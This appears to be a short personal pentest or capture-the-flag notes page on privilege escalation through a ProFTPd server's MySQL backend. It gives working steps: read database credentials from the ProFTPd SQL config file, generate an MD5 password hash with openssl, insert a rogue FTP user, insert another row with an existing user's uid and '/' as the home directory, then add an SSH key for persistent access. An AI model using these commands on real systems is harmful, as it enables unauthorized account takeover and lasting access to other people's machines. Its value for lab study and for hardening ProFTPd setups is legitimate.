# ProFTPd

The following is specifically for using ProFTPd for privilege escalation. If you have read access to the ProFTPd config file at `/etc/proftpd/sql.conf`, you can find some creds to connect to mysql in that file. More is explained under “Linux Tips”.

To insert a new user in the database for privesc, generate your password here:

```jsx
/bin/echo "{md5}"`/bin/echo -n "password" | openssl dgst -binary -md5 | openssl enc -base64`
// outputs {md5}X03MO1qnZdYdgyfeuILPmQ==
```

Put this in Mysql with your newly generated password hash

```jsx
INSERT INTO ftpuser (userid,passwd,uid,gid,homedir,shell) VALUES ("virusspec","{md5}X03MO1qnZdYdgyfeuILPmQ==","1001","1001","/home/benoit","/bin/bash");
```

![Untitled](ProFTPd%2009239e300e9e4681b40e318966aeacd2/Untitled.png)

You can now login to ftp as the new user

![Untitled](ProFTPd%2009239e300e9e4681b40e318966aeacd2/Untitled%201.png)

(reference of this from here [https://medium.com/@nico26deo/how-to-set-up-proftpd-with-a-mysql-backend-on-ubuntu-c6f23a638caf](https://medium.com/@nico26deo/how-to-set-up-proftpd-with-a-mysql-backend-on-ubuntu-c6f23a638caf))

That’s how to create any user. If you want to make a specific user to privilege escalate to (for me it is “benoit”, you’ll do the following).

```jsx
INSERT INTO ftpuser (id, userid, passwd, uid,gid,homedir, shell,count, accessed, modified) VALUES (NULL, 'benoit', '{md5}X03MO1qnZdYdgyfeuILPmQ==', '1000', '1000', '/', '/bin/bash', '0', '2022–12–05 05:26:29', '2022–12–12 05:26:29');
```

Optionally, you could set the values for “accessed” and “modified” as null or leave them out completely. They don’t really matter.

From there, log in as your desired user and add an ssh key.

![Untitled](ProFTPd%2009239e300e9e4681b40e318966aeacd2/Untitled%202.png)

![Untitled](ProFTPd%2009239e300e9e4681b40e318966aeacd2/Untitled%203.png)